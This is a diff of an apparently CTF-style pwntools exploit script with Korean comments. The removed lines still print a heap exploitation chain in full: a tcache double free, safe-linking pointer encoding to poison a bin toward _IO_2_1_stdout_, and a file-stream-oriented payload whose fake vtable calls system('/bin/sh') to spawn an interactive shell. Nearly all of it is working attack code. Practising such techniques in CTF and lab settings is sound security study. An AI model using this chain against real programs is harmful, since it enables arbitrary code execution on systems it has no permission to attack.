@@ -43,58 +43,5 @@ heap_base = heap_val << 12
 log.info(f"Libc Base: {hex(libc_base)}")
 log.info(f"Heap Base: {hex(heap_base)}")
 
-log.info("=== Double Free for Count Manipulation ===")
 
-stdout_addr = libc.symbols['_IO_2_1_stdout_']
-
-# 1. Key Corruption (Use sendline to send 8 bytes payload + \n)
-#    Chunk 1의 Key(offset 8)의 첫 바이트가 '\n'으로 덮어써짐 -> Double Free 가능해짐
-#    Payload 내용은 중요하지 않음 (나중에 다시 쓸 것임), 8바이트 맞춰주기
-dummy_payload = b"X"*8 
-edit(1, dummy_payload) 
-
-# 2. Double Free (Count=2)
-dele(1) 
-
-# 3. Alloc 1 (Pop C1) -> Write stdout ptr
-#    C1을 다시 할당받으면서 fd에 encoded_stdout을 씀
-#    Bin: C1 -> stdout. Count=1.
-payload = p64(protect(heap_base, stdout_addr))
-allocate(1, 0x200, payload)
-
-# 4. Alloc 1 (Pop C1 again) -> Consume Junk
-#    Bin: stdout. Count=0.
-allocate(1, 0x200, b"JUNK")
-
-# 5. Alloc 0 (Pop stdout) -> Trigger!
-#    Count=0이어도 위에서 pop을 했기 때문에 내부 상태가 꼬여서 나올 수도 있으나
-#    원칙적으로는 Count가 부족함. Double Free로 Count=2를 만들었으니 성공해야 함.
-
-# FSOP Payload
-stdout_lock = libc_base + 0x21ba80
-wfile_jumps = libc_base + 0x2160c0
-system_addr = libc.symbols['system']
-
-fake_stdout = b"  /bin/sh\0"
-fake_stdout = fake_stdout.ljust(0x88, b"\x00")
-fake_stdout += p64(stdout_lock)
-fake_stdout = fake_stdout.ljust(0xa0, b"\x00")
-fake_stdout += p64(stdout_addr + 0x100)
-fake_stdout = fake_stdout.ljust(0xc0, b"\x00")
-fake_stdout += p64(1)
-fake_stdout = fake_stdout.ljust(0xd8, b"\x00")
-fake_stdout += p64(wfile_jumps)
-
-fake_wide = b"\x00" * 0xe0 
-fake_wide += p64(stdout_addr + 0x200) 
-
-fake_vtable = b"\x00" * 0x68
-fake_vtable += p64(system_addr)
-
-final_payload = fake_stdout.ljust(0x100, b"\x00") + fake_wide.ljust(0x100, b"\x00") + fake_vtable
-
-# Trigger
-allocate(0, 0x200, final_payload)
-
-p.interactive()
 
